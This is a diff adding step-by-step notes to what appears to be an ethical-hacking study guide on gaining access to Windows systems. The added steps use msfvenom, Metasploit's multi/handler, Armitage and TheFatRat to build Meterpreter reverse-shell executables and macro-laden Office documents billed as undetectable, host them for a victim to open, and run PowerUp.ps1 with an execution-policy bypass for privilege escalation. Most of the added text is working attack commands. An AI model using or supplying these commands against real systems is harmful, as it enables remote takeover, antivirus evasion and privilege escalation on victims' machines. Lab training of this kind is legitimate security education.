@@ -33,11 +33,90 @@ As an ethical hacker or penetration tester, you can use the L0phtCrack tool for 
 
 ### Find vulnerabilities on exploit sites
 
-
+https://www.exploit-db.com/
 
 ### Exploit client-side vulnerabilities and establish a VNC session
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o OutputPath.exe 
+service apache2 start
+cp OutputPath.exe /var/www/html/share
+```
+Share the file
+```
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 
+set LPORT 444
+exploit
+```
+After gaining access
+PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
+```
+sysinfo
+upload /root/PowerSploit/Privesc/PowerUp.ps1 
+shell
+powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks” 
+exit
+run vnc
+```
+
 ### Gain access to a remote system using Armitage
+
+```
+service postgresql start
+```
+Open armitage Pentesting Tools -> Exploitation -> Metasploit Framework -> armitage
+Hosts -> Nmap Scan -> Intense Scan
+Payload -> windows -> meterpreter -> meterreter_reverse_tcp -> lport 444 -> output exe -> Launch
+Save at any location of choice
+Terminal
+```
+cp source destination
+service apache2 start
+```
+Armitage
+double click meterpreter_reverse_tcp -> lport 444 -> Output multi/handler
+
+Let victim click the app
+
+right click on pc -> meterpreter 1 -> interact -> meterpreter shell
+```
+sysinfo
+```
+right click on target pc -> Meterpreter 1 --> Explore --> Browse Files.
+
 ### Hack a Windows machines with a malicious Office document using TheFatRat
+
+```
+fatrat
+  [06] Create Fud Backdoor 1000% with PwnWinds [Excelent]
+  [3] Create exe file with apache + Powershell (FUD 100%)
+  [ 3 ] windows/meterpreter/reverse_tcp
+```
+generated payload appear and are saved at the location /root/TheFatRat_Generated
+```
+  [9] Back to Menu 
+  [07] Create Backdoor For Office with Microsploit
+  |2| The Microsoft Office Macro on Windows
+  y
+  [ 3 ] windows/meterpreter/reverse_tcp
+```
+```
+cp /root/Fatrat_Generated/BadDoc.docm /var/www/html/share 
+service apache2 start
+msfconsole
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST 
+set LPORT
+exploit
+```
+```
+sysinfo
+```
+
 
 ## Privilege Escalation
 
